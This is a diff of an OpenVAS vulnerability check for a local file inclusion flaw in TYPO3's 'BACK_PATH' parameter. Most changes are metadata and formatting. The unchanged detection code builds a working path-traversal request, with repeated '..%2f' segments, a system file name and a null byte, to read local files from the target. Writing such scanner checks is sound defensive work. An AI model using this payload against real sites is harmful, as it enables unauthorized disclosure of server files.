@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_typo3_back_path_lfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
+# $Id: secpod_typo3_back_path_lfi_vuln.nasl 11160 2018-08-29 12:43:22Z asteins $
 #
 # TYPO3 'BACK_PATH' Parameter Local File Include Vulnerability
 #
@@ -29,32 +29,33 @@ CPE = "cpe:/a:typo3:typo3";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902795");
-  script_version("$Revision: 7577 $");
+  script_version("$Revision: 11160 $");
   script_cve_id("CVE-2011-4614");
   script_bugtraq_id(51090);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-29 14:43:22 +0200 (Wed, 29 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-02-22 13:46:49 +0530 (Wed, 22 Feb 2012)");
   script_name("TYPO3 'BACK_PATH' Parameter Local File Include Vulnerability");
 
-  script_tag(name : "impact" , value : "Successful exploitation could allow an attacker to obtain arbitrary local
+  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to obtain arbitrary local
 files in the context of an affected site.
 
 Impact Level: Application");
-  script_tag(name : "vuldetect" , value : "Send a Crafted HTTP GET request and check whether it is able to get sensitive
+  script_tag(name:"vuldetect", value:"Send a Crafted HTTP GET request and check whether it is able to get sensitive
 information.");
-  script_tag(name : "insight" , value : "The flaw is due to an input passed to the 'BACK_PATH' parameter in
+  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'BACK_PATH' parameter in
 'typo3/sysext/workspaces/Classes/Controller/AbstractController.php' is not
 properly verified before being used to include files.");
-  script_tag(name : "solution" , value : "Upgrade to TYPO3 version 4.5.9 or 4.6.2 or later,
+  script_tag(name:"solution", value:"Upgrade to TYPO3 version 4.5.9 or 4.6.2 or later,
 For updates refer to http://typo3.org/download/packages/");
-  script_tag(name : "summary" , value : "This host is running TYPO3 and is prone to local file inclusion vulnerability.");
-  script_tag(name : "affected" , value : "TYPO3 version 4.5.x before 4.5.9, 4.6.x before 4.6.2 and development versions
+  script_tag(name:"summary", value:"This host is running TYPO3 and is prone to local file inclusion vulnerability.");
+  script_tag(name:"affected", value:"TYPO3 version 4.5.x before 4.5.9, 4.6.x before 4.6.2 and development versions
 of 4.7");
+  script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/47201");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72959");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/47201");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72959");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2012 SecPod");
@@ -70,7 +71,7 @@ include("misc_func.inc");
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
@@ -79,12 +80,10 @@ files = traversal_files();
 
 foreach file (keys(files))
 {
-  ## Constuct exploit
   url = string(dir, "/sysext/workspaces/Classes/Controller/" +
               "AbstractController.php?BACK_PATH=",
               crap(data:"..%2f",length:5*10), files[file], "%00");
 
-  ## Confirm exploit worked properly or not
   if(http_vuln_check(port:port, url:url, pattern:file))
   {
     security_message(port:port);
